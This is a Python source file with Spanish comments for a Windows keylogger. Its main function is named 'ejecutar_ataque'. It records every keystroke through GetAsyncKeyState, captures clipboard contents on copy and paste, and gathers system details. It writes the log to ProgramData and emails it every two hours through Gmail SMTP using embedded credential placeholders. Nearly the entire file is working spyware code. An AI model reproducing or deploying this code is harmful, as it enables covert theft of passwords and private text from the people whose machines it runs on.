# -*- coding: UTF-8 -*-

# modulo para la lectura de las teclas
import ctypes

# modulos para trabajar con el tiempo
import time
import datetime

# modulos para el envio de archivos por email
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders

# modulo para obtener información sobre el sistema
import platform


# se definen los diccionarios que se necesitarán para mapear las equivalencias entre teclas especiales o combinaciones de teclas
teclas_inicio_combinaciones = {'Ctrl': 0xa2, 'Alt': 0xa4, 'Shift': 0xa0, 'AltGr': 0xa5, 'RShift': 0xa1, 'RCtrl': 0xa3}
teclas_ctrl_combinaciones = {0x43: ['C', '<copiar>'], 0x56: ['V', '<pegar>'], 0x58: ['X', '<cortar>'], 0x5a: ['Z', '<deshacer>'], 0x53: ['S', '<guardar>'], 0x41: ['A', '<seleccion-todo>'], 0x1b: ['Esc','<menu-windows>']}
teclas_shift_combinaciones = {0x30: ['0', '='], 0x31: ['1', '!'], 0x32: ['2', '"'], 0x33: ['3', '·'], 0x34: ['4', '$'], 0x35: ['5', '%'], 0x36: ['6', '&'], 0x37: ['7', '/'], 0x38: ['8', '('], 0x39: ['9', ')'], 0xdc: ['º', 'ª'], 0xdb: ["'", '?'], 0xdd: ['¡', '¿'], 0xba: ['`', '^'], 0xbb: ['+', '*'], 0xde: ['´', '¨'], 0xbf: ['ç', 'Ç'], 0xbc: [',', ';'], 0xbe: ['.', ':'], 0xbd: ['-', '_']}
teclas_alt_gr_combinaciones = {0x31: ['1', '|'], 0x32: ['2', '@'], 0x33: ['3', '#'], 0x34: ['4', '~'], 0x35: ['5', '€'], 0x36: ['6', '¬'], 0xdc: ['º', '\\'], 0xba: ['`', '['], 0xbb: ['+', ']'], 0xde: ['´', '{'], 0xbf: ['ç', '}']} 
teclas_direccion = {0x26: '<arriba>', 0x28: '<abajo>', 0x25: '<izquierda>', 0x27: '<derecha>'} 
teclas_alt_combinaciones = {0x09: ['Tab', '<cambio-ventana>'], 0x13: ['Enter', '<abrir-propiedades>']}
teclas_copiar_pegar = {0x43: ['C', '<copiar>'], 0x56: ['V', '<pegar>'], 0x58: ['X', '<cortar>']}
teclas_especiales = {0x09: 'Tab', 0x14: 'BloqMayus', 0x1b: 'Esc', 0x2e: 'Del'}


# se definen las variables que deben poder ser accedidas por todas las funciones
output_path = 'C:\\ProgramData\\pulsaciones_grabadas.txt' 
email_de = # introducir-email
email_para = email_de
passwd = # introducir-password

# Se definen las librerias dinámicas 'windll' necesarias
kernel32 = ctypes.windll.kernel32
user32 = ctypes.windll.user32


# se definen las funciones que se utilizarán
def escribir_archivo(teclas_almacenadas):
    with open(output_path, "a") as f:
        for tecla in teclas_almacenadas:
            f.write(tecla)
    f.close()


# función para el envio del archivo de pulsaciones guardadas por mail
def enviar_mail():
    archivo_enviar = open(output_path, "rb")

    mensaje_prep = MIMEMultipart()
    mensaje_prep["From"] = email_de
    mensaje_prep['To'] = email_para
    mensaje_prep['Subject'] = "Ejecución Keylogger"

    objeto_mensaje = MIMEBase('application','octet-stream')
    objeto_mensaje.set_payload((archivo_enviar).read())
    encoders.encode_base64(objeto_mensaje)
    dia_actual = datetime.datetime.now()
    objeto_mensaje.add_header('Content-Disposition', 'attachment',  filename=str('pulsaciones_grabadas_' + dia_actual.strftime("%D_%H%M%S").replace("/","") + '.txt'))

    mensaje_prep.attach(objeto_mensaje)
    mensaje_enviar = mensaje_prep.as_string()

    sesion_email = smtplib.SMTP(host='smtp.gmail.com', port=587)
    sesion_email.starttls()
    sesion_email.login(email_de, passwd)
    sesion_email.sendmail(email_de, email_para, mensaje_enviar)
    sesion_email.quit()


# función para el almacen del contenido del clipboard
def contenido_clipboard():
    contenido_clipboard = ''
    user32.GetClipboardData.restype = ctypes.c_void_p  # se define el tipo del clipboard como puntero
    
    user32.OpenClipboard(0)
    try:
        dir_mem_contenido_clipboard = user32.GetClipboardData(1) # se obtiene un puntero la dir de memoria donde esta el contenido del clipboard
        contenido_clipboard = ctypes.c_char_p(dir_mem_contenido_clipboard).value.decode('utf-8')  # se obtiene un puntero 'char' (string) a la dir de memoria donde esta el contenido del clipboard y se guarda el contenido en la variable. el decode es porque obtenemos bytes y necesitamos guardarlo como string
    except:
        None

    user32.CloseClipboard()

    return contenido_clipboard


# función para almacenar en el archivo las teclas pulsadas y enviar el mail - se ejecuta si se introduce un comando especial de teclas
def export_manual(teclas_almacenadas):
    teclas_almacenadas.append('\n<fin-export-manual>')
    escribir_archivo(teclas_almacenadas)
    
    # además enviamos el archivo por mail
    enviar_mail()

    # reseteamos el array de almacen de teclas
    teclas_almacenadas = []
    teclas_almacenadas.append('<continuación-ataque>\n')

    return teclas_almacenadas


# función donde se leerán y almacenarán las teclas que se están pulsando actualmente - se ha decidido no usar librerías que proporcionan la conversión automática, si no que se descubre el número de la/s tecla/s que estén pulsadas y, dependiendo de si es una letra/número o una combinación de teclas especial, se almacenarán los valores correspondientes en el array (p.e. si se detecta la combinación 'ctrl+c' se escribirá '<copiar>' en vez de las teclas 'ctrl' y 'c')
def leer_keystrokes(teclas_almacenadas, tiempo_ultima_tecla_almacenada, fin_programa):
    GetAsyncKeyState = user32.GetAsyncKeyState # función para saber si una key esta up o down

    if (GetAsyncKeyState(teclas_inicio_combinaciones['Ctrl'])) and (GetAsyncKeyState(teclas_inicio_combinaciones['Alt'])) and (GetAsyncKeyState(teclas_inicio_combinaciones['AltGr'])) and (GetAsyncKeyState(0x20)): # combinación killswitch para parar el keylogger
        fin_programa = True

    elif (GetAsyncKeyState(teclas_inicio_combinaciones['Ctrl'])) and (GetAsyncKeyState(teclas_inicio_combinaciones['Alt'])) and (GetAsyncKeyState(teclas_inicio_combinaciones['Shift'])) and (GetAsyncKeyState(0x53)): # combinación para el guardado (export) manual
        teclas_almacenadas = export_manual(teclas_almacenadas)
        time.sleep(2)  # si no, se exporta muchas veces al ser una detección rápida de las teclas

    else:
        pos_tecla = 0
        while (pos_tecla < 256): # los valores de tecla detectados irán del 0 al 255 (ASCII)
            if GetAsyncKeyState(pos_tecla) & 1: # si se presiona una tecla y coincide con un char ASCII 
                # en este punto se encuentra un 'key press', hay diferentes situaciones que pueden suceder
                tecla_pulsada = pos_tecla

                if (GetAsyncKeyState(teclas_inicio_combinaciones['Ctrl']) or GetAsyncKeyState(teclas_inicio_combinaciones['RCtrl'])) and (tecla_pulsada in teclas_ctrl_combinaciones):
                        # entra si se pulsan a la vez las teclas 'ctrl' y alguna de las teclas que forman combinaciones típicas con 'ctrl' que nos puedan ser útiles y la guarda con su nombre equivalente
                    teclas_almacenadas.append(teclas_ctrl_combinaciones[tecla_pulsada][1]) # se añade la definición de la combinación a la lista

                    if (tecla_pulsada in teclas_copiar_pegar): # si se copia, corta o se pega contenido del clipboard, se almacenará en el array también
                        contenido_clipboard()
                        teclas_almacenadas.append('\n<inicio-contenido-del-clipboard>\n')
                        teclas_almacenadas.append(contenido_clipboard())
                        teclas_almacenadas.append('\n<fin-contenido-del-clipboard>\n')

                elif (GetAsyncKeyState(teclas_inicio_combinaciones['Alt'])) and (tecla_pulsada in teclas_alt_combinaciones):
                        # entra si se pulsan a la vez las teclas 'alt' y alguna de las teclas que forman combinaciones típicas con 'alt' que nos puedan ser útiles y la guarda con su nombre equivalente
                    teclas_almacenadas.append(teclas_alt_combinaciones[tecla_pulsada][1]) # se añade la definición de la combinación a la lista

                elif (GetAsyncKeyState(teclas_inicio_combinaciones['Shift']) or GetAsyncKeyState(teclas_inicio_combinaciones['RShift'])) and (tecla_pulsada in teclas_shift_combinaciones):
                        # entra si se pulsan a la vez las teclas 'shift' y alguna de las teclas que forman combinaciones típicas con 'shift' que nos puedan ser útiles y la guarda con su nombre equivalente
                    teclas_almacenadas.append(teclas_shift_combinaciones[tecla_pulsada][1]) # se añade la definición de la combinación a la lista
                        
                elif (GetAsyncKeyState(teclas_inicio_combinaciones['Shift']) or GetAsyncKeyState(teclas_inicio_combinaciones['RShift'])) and (0x41 <= tecla_pulsada <= 0x5a):
                    teclas_almacenadas.append(chr(tecla_pulsada)) # si se detecta 'shift' mas una letra, la guarda en mayúscula, el ultimo 'else' lo guardará en minuscula ya que no habrá detectado el shift

                elif (GetAsyncKeyState(teclas_inicio_combinaciones['AltGr'])) and (tecla_pulsada in teclas_alt_gr_combinaciones):
                    teclas_almacenadas.append(teclas_alt_gr_combinaciones[tecla_pulsada][1]) # se añade la definición de la combinación a la lista

                elif (GetAsyncKeyState(teclas_inicio_combinaciones['Ctrl']) or GetAsyncKeyState(teclas_inicio_combinaciones['RCtrl'])) and (GetAsyncKeyState(teclas_inicio_combinaciones['Shift']) or GetAsyncKeyState(teclas_inicio_combinaciones['RShift'])) and (tecla_pulsada in teclas_ctrl_combinaciones):
                        # en algunos programas se necesita hacer 'ctrl'+'shift'+'<tecla>' - caso especial
                    teclas_almacenadas.append(teclas_ctrl_combinaciones[tecla_pulsada][1]) # se añade la definición de la combinación a la lista

                    if (tecla_pulsada in teclas_copiar_pegar): # si se copia, corta o se pega contenido del clipboard, se almacenará en el array también
                        contenido_clipboard()
                        teclas_almacenadas.append('\n<inicio-contenido-del-clipboard>\n')
                        teclas_almacenadas.append(contenido_clipboard())
                        teclas_almacenadas.append('\n<fin-contenido-del-clipboard>\n')

                elif tecla_pulsada in teclas_direccion: # si es una tecla de las flechas
                    teclas_almacenadas.append(teclas_direccion[tecla_pulsada])

                elif tecla_pulsada ==  0x20: # tecla-espacio
                    teclas_almacenadas.append(' ')

                elif tecla_pulsada == 0x0d:  #tecla-enter
                    teclas_almacenadas.append('<enter>')
                    teclas_almacenadas.append('\n') # para que la siguiente sea una linea a parte

                elif tecla_pulsada == 0x08: #tecla-borrar
                    teclas_almacenadas.append('<borrar>')

                elif tecla_pulsada in teclas_especiales:  # si es alguna de las otras teclas especiales
                    teclas_almacenadas.append('\n')
                    teclas_almacenadas.append(teclas_especiales[tecla_pulsada])
                    teclas_almacenadas.append('\n') # para que sea una linea a parte

                elif tecla_pulsada == 0xdc: # no guarda bien este valor
                    teclas_almacenadas.append('º')

                elif tecla_pulsada == 0xc0: # no guarda bien este valor
                    teclas_almacenadas.append('ñ')

                elif 0x19 < tecla_pulsada < 0x7f:  # por ultimo, si no es ningun caso especial de los considerados, los valores que nos interesan, como letras y números, estarán entre estos valores que son los 'printable chars' en ASCII
                    teclas_almacenadas.append(chr(tecla_pulsada).lower())

                tiempo_ultima_tecla_almacenada = time.perf_counter() # contador - se actualiza el tiempo donde se encontró la ultima tecla

            pos_tecla += 1

    return teclas_almacenadas, tiempo_ultima_tecla_almacenada, fin_programa


# función para añadir al array información sobre el sistema donde se ejecuta el programa
def get_info_sistema(teclas_almacenadas):
    teclas_almacenadas.append('<system-info>\n')
    teclas_almacenadas.append('\tsystem: ' + platform.system() + ' ' + platform.version() + '\n\tmachine-name: ' + platform.node() + '\n\tprocessor: ' + platform.machine() + '\n')
    teclas_almacenadas.append('<fin-system-info>\n')

    return teclas_almacenadas


# función principal del programa
def ejecutar_ataque():
    # se inicializa el array donde se almacenarán las teclas pulsadas (y otros datos)
    teclas_almacenadas = []
    teclas_almacenadas.append('<inicio-ataque>\n')
    teclas_almacenadas = get_info_sistema(teclas_almacenadas) # añadimos al array información sobre el sistema actual

    # iniciamos los contadores de control de eventos
    tiempo_inicio_contador_guardar_archivo = time.perf_counter()
    tiempo_ultima_tecla_almacenada = time.perf_counter()
    tiempo_desde_ultimo_envio_mail = time.perf_counter()

    # definimos la condición de fin de programa como falsa
    fin_programa = False

    while (not fin_programa): # existe una combinación de teclas 'killswitch' para parar el programa
        teclas_almacenadas, tiempo_ultima_tecla_almacenada, fin_programa = leer_keystrokes(teclas_almacenadas, tiempo_ultima_tecla_almacenada, fin_programa)

        # condición de control: si pasan 5 minutos sin detectar una tecla, se añade un '\n' al array
        if (time.perf_counter() - tiempo_ultima_tecla_almacenada) > 300:  # (tiempo actual - el ultimo tiempo almacenado despues de detectar una tecla) > 300 segundos (que son 5 minutos)
                teclas_almacenadas.append('\n')

        # condición de control: cada 10 minutos se guarda la información del array en el archivo  
        if (time.perf_counter() - tiempo_inicio_contador_guardar_archivo) > (10 * 60): # 10 minutos convertidos a segundos (x 60)
            escribir_archivo(teclas_almacenadas)
            teclas_almacenadas = []
            tiempo_inicio_contador_guardar_archivo = time.perf_counter()

        # condición de control: cada 2 horas se envía el archivo con la información almacenada por mail
        if (time.perf_counter() - tiempo_desde_ultimo_envio_mail) > (2 * 3600): # 2 horas convertidas a segundos (x 3600)
            escribir_archivo(teclas_almacenadas) # primero se guarda el array en el archivo para que esté el archivo actualizado
            enviar_mail() # se envía el mail con el archivo


# inicio del programa
ejecutar_ataque()
